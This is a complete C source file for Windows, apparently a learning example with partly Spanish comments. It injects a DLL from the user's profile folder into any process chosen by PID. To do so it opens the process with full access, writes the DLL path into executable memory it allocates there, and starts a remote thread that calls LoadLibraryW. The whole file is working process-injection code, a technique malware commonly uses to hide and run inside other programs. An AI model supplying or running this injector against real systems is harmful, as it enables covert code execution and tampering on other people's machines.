#include <windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

    // Declare variables
    PVOID buffer = NULL;
    DWORD pid, tid = NULL;
    HANDLE hProcess, hThread = NULL;
    HANDLE hKernel32 = NULL;

    wchar_t dllPath[MAX_PATH];
    wchar_t fileName[] = L"dllExampleInjection.dll";
    
    
    // Guarda en dllPath los que devuelve _wgetenv(L"USERPROFILE") separado por \\ filename (dllExampleInjection.dll)
    // De esta forma la dll se guarda siempre en C:\Users\<usuario>, independientemente del usuario
    swprintf(dllPath, MAX_PATH, L"%s\\%s", _wgetenv(L"USERPROFILE"), fileName);

    size_t pathSize = sizeof(dllPath);

    // Get handle to the process in which we want to inject the dll
    if (argc < 2) {
        return EXIT_FAILURE;
    }

    pid = atoi(argv[1]);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); 

    if (hProcess == NULL) {
        printf("print 1");
        return EXIT_FAILURE;
    }

    // Reserve memory in the address space of the process
    buffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (buffer == NULL) {
        printf("print 2");
        return EXIT_FAILURE;
    }

    // Write into the memory space of the process
    WriteProcessMemory(hProcess, buffer, dllPath, pathSize, NULL);

    // Get a handle to Kernel32 dll
    hKernel32 = GetModuleHandleW(L"kernel32");

	if (hKernel32 == NULL) {
        printf("print 3");
		return EXIT_FAILURE;
	}

    // Get the address of the LoadLibrary function from the kernel32.dll
    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    // Create a thread in the target process to execute the function LoadLibraryW with the argument buffer
    hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, buffer, 0, &tid);

    
    if (hThread == NULL) {
        printf("print 4");
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    
    // Wait for the thread to finish its execution indefinitely
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);


    return EXIT_SUCCESS;

}